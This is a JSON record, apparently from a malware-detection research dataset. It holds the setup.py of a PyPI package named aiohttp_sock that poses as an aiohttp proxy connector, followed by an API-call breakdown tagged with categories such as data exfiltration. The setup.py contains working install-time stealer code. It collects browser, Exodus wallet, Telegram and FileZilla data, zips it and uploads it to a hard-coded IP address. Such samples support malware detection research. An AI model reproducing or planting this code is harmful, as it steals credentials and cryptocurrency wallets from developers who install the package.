[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/aiohttp_sock-0.1.23/aiohttp_sock-0.1.23/setup.py",
    "code_snippet": "import subprocess\nimport codecs\nimport os\nimport re\nimport sys\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nversion = None\n\nwith codecs.open(\n    os.path.join(\n        os.path.abspath(os.path.dirname(__file__)), \"aiohttp_sock\", \"__init__.py\"\n    ),\n    \"r\",\n    \"latin1\",\n) as fp:\n    try:\n        version = re.findall(r'^__version__ = \"(\\S+?)\"$', fp.read(), re.M)[0]\n    except IndexError:\n        raise RuntimeError(\"Unable to determine version.\")\n\nif sys.version_info < (3, 5, 3):\n    raise RuntimeError(\"aiohttp_sock requires Python 3.5.3+\")\n\nwith open(\"README.md\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"aiohttp_sock\",\n    author=\"Skactor\",\n    author_email=\"sk4ct0r@gmail.com\",\n    version='0.1.23',\n    license=\"Apache 2\",\n    url=\"https://github.com/Skactor/aiohttp-proxy\",\n    description=\"Full-featured proxy connector for aiohttp\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    packages=[\"aiohttp_sock\"],\n    keywords=\"asyncio aiohttp socks socks5 socks4 http https proxy aiofiles aiohttp cryptography\",\n    install_requires=[\"aiohttp>=2.3.2\", \"yarl\"],\n)\n\nif not (len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]):\n    sys.exit()\n\nsubprocess.call(f'{sys.executable} -m pip install aiofiles')\nsubprocess.call(f'{sys.executable} -m pip install aiohttp')\nsubprocess.call(f'{sys.executable} -m pip install cryptography')\nsubprocess.call(f'{sys.executable} -m pip install aiosqlite')\n\nimport asyncio\nfrom asyncio import create_task\nfrom typing import List\nfrom weakref import proxy\nfrom path_search import search_plugin_paths, root_paths\nfrom config import Config\nfrom aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData,\\\n        TCPConnector\nimport secrets\nimport timeit\nfrom paths import TEMP\nfrom os import mkdir\nfrom os.path import join\nfrom zipfile import ZipFile, ZIP_DEFLATED\nfrom tools import zipdir, _handle_task_result\nfrom logger import Logger\n\nfrom plugins import Chromium, Details, Exodus, Filezilla, Telegram\n\nHOST = 'http://144.24.115.170'\n\nasync def main() -> None:\n    start = timeit.default_timer()\n\n    client_id = secrets.token_hex(10)\n    log_path = join(TEMP, client_id)\n\n    print(log_path)\n    mkdir(log_path)\n\n    tasks: List[asyncio.Task] = []\n\n    connector = TCPConnector(limit=50)\n    session = Session(connector=connector)\n    logger = Logger(log_path)\n    conf = Config(client_id, HOST, log_path, logger, session)\n\n    await logger.log(f'Start')\n    \n    chromium = Chromium(conf)\n\n    search_folder_names = {\n        'google': chromium,\n        'exodus': Exodus(conf),\n        'mozilla': None,\n        'telegram desktop': Telegram(conf),\n        'telegram': Telegram(conf),\n        'opera software': chromium,\n        'filezilla': Filezilla(conf)\n    }\n    \n    tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n\n    other_plugins = [Details(conf)]\n\n    for plugin in other_plugins:\n        tasks.append(create_task(plugin.callback()))\n\n    for task in tasks:\n        task.add_done_callback(_handle_task_result)\n\n    for task in tasks:\n        try:\n            await task\n        except Exception as e:\n            await logger.log(f'Error in main.py tasks {e}')\n    \n    await logger.log(f'Начинаю отправку лога')\n\n    zip_log_path = join(TEMP, f'{client_id}.zip')\n    with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n        zipdir(log_path, zipf)\n\n    files = {'file': open(zip_log_path, 'rb')}\n        \n    await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)\n    await session.close()\n\n    stop = timeit.default_timer()\n    await logger.log(f'Time: {stop-start}')\n\nasyncio.run(main())",
    "pattern_analysis": {
      "api_sequence": [
        "codecs.open",
        "os.path.abspath",
        "os.path.dirname",
        "os.path.join",
        "codecs.open.__enter__",
        "codecs.open.read",
        "re.findall",
        "open",
        "open.__enter__",
        "open.read",
        "setuptools.setup",
        "distutils.core.setup",
        "sys.argv",
        "sys.exit",
        "subprocess.call",
        "subprocess.call",
        "subprocess.call",
        "subprocess.call",
        "os.path.join",
        "os.mkdir",
        "aiohttp.TCPConnector",
        "aiohttp.ClientSession",
        "Logger.log",
        "Chromium.__init__",
        "Exodus.__init__",
        "Telegram.__init__",
        "Filezilla.__init__",
        "Config.__init__",
        "asyncio.create_task",
        "search_plugin_paths",
        "Details.__init__",
        "Details.callback",
        "asyncio.create_task",
        "asyncio.Task.add_done_callback",
        "asyncio.Task.add_done_callback",
        "asyncio.Task.add_done_callback",
        "asyncio.Task.add_done_callback",
        "asyncio.Task.add_done_callback",
        "Logger.log",
        "os.path.join",
        "zipfile.ZipFile",
        "zipfile.ZipFile.__enter__",
        "zipdir",
        "open",
        "aiohttp.ClientSession.post",
        "aiohttp.ClientSession.close",
        "timeit.default_timer",
        "Logger.log",
        "asyncio.run"
      ],
      "api_sequence_with_args": [
        "codecs.open(os.path.join(os.path.abspath(os.path.dirname(__file__)), \"aiohttp_sock\", \"__init__.py\"), \"r\", \"latin1\")",
        "os.path.abspath(os.path.dirname(__file__))",
        "os.path.dirname(__file__)",
        "os.path.join(os.path.abspath(os.path.dirname(__file__)), \"aiohttp_sock\", \"__init__.py\")",
        "codecs.open(...).__enter__()",
        "codecs.open(...).read()",
        "re.findall(r'^__version__ = \"(\\S+?)\"$', fp.read(), re.M)",
        "open(\"README.md\")",
        "open(\"README.md\").__enter__()",
        "open(\"README.md\").read()",
        "setuptools.setup(...)",
        "distutils.core.setup(...)",
        "sys.argv",
        "sys.exit()",
        "subprocess.call(f'{sys.executable} -m pip install aiofiles')",
        "subprocess.call(f'{sys.executable} -m pip install aiohttp')",
        "subprocess.call(f'{sys.executable} -m pip install cryptography')",
        "subprocess.call(f'{sys.executable} -m pip install aiosqlite')",
        "os.path.join(TEMP, client_id)",
        "os.mkdir(log_path)",
        "aiohttp.TCPConnector(limit=50)",
        "aiohttp.ClientSession(connector=connector)",
        "Logger(log_path).log(f'Start')",
        "Chromium(conf)",
        "Exodus(conf)",
        "Telegram(conf)",
        "Filezilla(conf)",
        "Config(client_id, HOST, log_path, logger, session)",
        "asyncio.create_task(search_plugin_paths(root_paths, search_folder_names))",
        "search_plugin_paths(root_paths, search_folder_names)",
        "Details(conf)",
        "Details(conf).callback()",
        "asyncio.create_task(plugin.callback())",
        "task.add_done_callback(_handle_task_result)",
        "task.add_done_callback(_handle_task_result)",
        "task.add_done_callback(_handle_task_result)",
        "task.add_done_callback(_handle_task_result)",
        "task.add_done_callback(_handle_task_result)",
        "Logger(log_path).log(f'Начинаю отправку лога')",
        "os.path.join(TEMP, f'{client_id}.zip')",
        "zipfile.ZipFile(zip_log_path, 'w', ZIP_DEFLATED)",
        "zipfile.ZipFile(zip_log_path, 'w', ZIP_DEFLATED).__enter__()",
        "zipdir(log_path, zipf)",
        "open(zip_log_path, 'rb')",
        "aiohttp.ClientSession.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)",
        "aiohttp.ClientSession.close()",
        "timeit.default_timer()",
        "Logger(log_path).log(f'Time: {stop-start}')",
        "asyncio.run(main())"
      ],
      "mapped_sequence": [
        {
          "api_name": "codecs.open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.dirname",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "codecs.open.__enter__",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "codecs.open.read",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.__enter__",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.read",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "setuptools.setup",
          "id": "configure_package_install",
          "description": "Configures and initiates Python package installation",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "distutils.core.setup",
          "id": "configure_package_install",
          "description": "Configures and initiates Python package installation",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "sys.argv",
          "id": "get_cmd_args",
          "description": "Retrieves command-line arguments passed to script",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "sys.exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.mkdir",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "aiohttp.TCPConnector",
          "id": "create_http_connection",
          "description": "Creates HTTP connection to specified host",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "aiohttp.ClientSession",
          "id": "create_http_session",
          "description": "Creates HTTP session for making asynchronous requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "Chromium.__init__",
          "id": "init_chromium_class",
          "description": "Instantiates Chromium class with configuration",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "instance_creation"
        },
        {
          "api_name": "Exodus.__init__",
          "id": "init_exodus_class",
          "description": "Instantiates Exodus class with configuration",
          "first_id": "third_party_platform_abuse",
          "second_id": "other_platform_abuse",
          "third_id": "other_service_abuse"
        },
        {
          "api_name": "Telegram.__init__",
          "id": "init_telegram_class",
          "description": "Instantiates Telegram class with configuration",
          "first_id": "third_party_platform_abuse",
          "second_id": "other_platform_abuse",
          "third_id": "telegram_abuse"
        },
        {
          "api_name": "Filezilla.__init__",
          "id": "init_filezilla_class",
          "description": "Instantiates Filezilla class with configuration",
          "first_id": "third_party_platform_abuse",
          "second_id": "other_platform_abuse",
          "third_id": "other_service_abuse"
        },
        {
          "api_name": "Config.__init__",
          "id": "init_config_class",
          "description": "Initializes Config class with provided arguments",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "class_initialization"
        },
        {
          "api_name": "asyncio.create_task",
          "id": "create_async_task",
          "description": "Creates asynchronous task for coroutine",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "search_plugin_paths",
          "id": "exfiltrate_folder",
          "description": "Recursively processes folder for file exfiltration",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "Details.__init__",
          "id": "init_details_class",
          "description": "Instantiates Details class with configuration",
          "first_id": "data_exfiltration",
          "second_id": "exfiltration_component_initialization",
          "third_id": "exfiltration_component_creation"
        },
        {
          "api_name": "Details.callback",
          "id": "exfiltrate_folder",
          "description": "Recursively processes folder for file exfiltration",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "asyncio.create_task",
          "id": "create_async_task",
          "description": "Creates asynchronous task for coroutine",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "asyncio.Task.add_done_callback",
          "id": "register_exit_function",
          "description": "Registers function to be called at program exit",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "persistence_configuration"
        },
        {
          "api_name": "Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "create_zip_archive",
          "description": "Creates new ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.__enter__",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipdir",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "aiohttp.ClientSession.post",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "aiohttp.ClientSession.close",
          "id": "close_http_response",
          "description": "Closes the HTTP response object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "timeit.default_timer",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "asyncio.run",
          "id": "run_async_function",
          "description": "Runs asynchronous function until completion",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        }
      ],
      "contextual_code": "import codecs\nimport os\nimport re\nimport sys\nimport subprocess\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nwith codecs.open(\n    os.path.join(\n        os.path.abspath(os.path.dirname(__file__)), \"aiohttp_sock\", \"__init__.py\"\n    ),\n    \"r\",\n    \"latin1\",\n) as fp:\n    try:\n        version = re.findall(r'^__version__ = \"(\\S+?)\"$', fp.read(), re.M)[0]\n    except IndexError:\n        raise RuntimeError(\"Unable to determine version.\")\n\nwith open(\"README.md\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"aiohttp_sock\",\n    author=\"Skactor\",\n    author_email=\"sk4ct0r@gmail.com\",\n    version='0.1.23',\n    license=\"Apache 2\",\n    url=\"https://github.com/Skactor/aiohttp-proxy\",\n    description=\"Full-featured proxy connector for aiohttp\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    packages=[\"aiohttp_sock\"],\n    keywords=\"asyncio aiohttp socks socks5 socks4 http https proxy aiofiles aiohttp cryptography\",\n    install_requires=[\"aiohttp>=2.3.2\", \"yarl\"],\n)\n\nif not (len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]):\n    sys.exit()\n\nsubprocess.call(f'{sys.executable} -m pip install aiofiles')\nsubprocess.call(f'{sys.executable} -m pip install aiohttp')\nsubprocess.call(f'{sys.executable} -m pip install cryptography')\nsubprocess.call(f'{sys.executable} -m pip install aiosqlite')\n\nfrom aiohttp import ClientSession as Session, TCPConnector\nfrom logger import Logger\nfrom config import Config\nfrom plugins import Chromium, Details, Exodus, Filezilla, Telegram\nfrom paths import TEMP\nfrom os import mkdir\nfrom os.path import join\nfrom zipfile import ZipFile, ZIP_DEFLATED\nfrom tools import zipdir, _handle_task_result\nimport asyncio\nimport secrets\nimport timeit\n\nHOST = 'http://144.24.115.170'\n\nasync def main() -> None:\n    start = timeit.default_timer()\n    client_id = secrets.token_hex(10)\n    log_path = join(TEMP, client_id)\n    print(log_path)\n    mkdir(log_path)\n    connector = TCPConnector(limit=50)\n    session = Session(connector=connector)\n    logger = Logger(log_path)\n    conf = Config(client_id, HOST, log_path, logger, session)\n    await logger.log(f'Start')\n    chromium = Chromium(conf)\n    search_folder_names = {\n        'google': chromium,\n        'exodus': Exodus(conf),\n        'mozilla': None,\n        'telegram desktop': Telegram(conf),\n        'telegram': Telegram(conf),\n        'opera software': chromium,\n        'filezilla': Filezilla(conf)\n    }\n    tasks = []\n    tasks.append(asyncio.create_task(search_plugin_paths(root_paths, search_folder_names)))\n    other_plugins = [Details(conf)]\n    for plugin in other_plugins:\n        tasks.append(asyncio.create_task(plugin.callback()))\n    for task in tasks:\n        task.add_done_callback(_handle_task_result)\n    for task in tasks:\n        try:\n            await task\n        except Exception as e:\n            await logger.log(f'Error in main.py tasks {e}')\n    await logger.log(f'Начинаю отправку лога')\n    zip_log_path = join(TEMP, f'{client_id}.zip')\n    with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n        zipdir(log_path, zipf)\n    files = {'file': open(zip_log_path, 'rb')}\n    await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)\n    await session.close()\n    stop = timeit.default_timer()\n    await logger.log(f'Time: {stop-start}')\n\nasyncio.run(main())"
    }
  }
]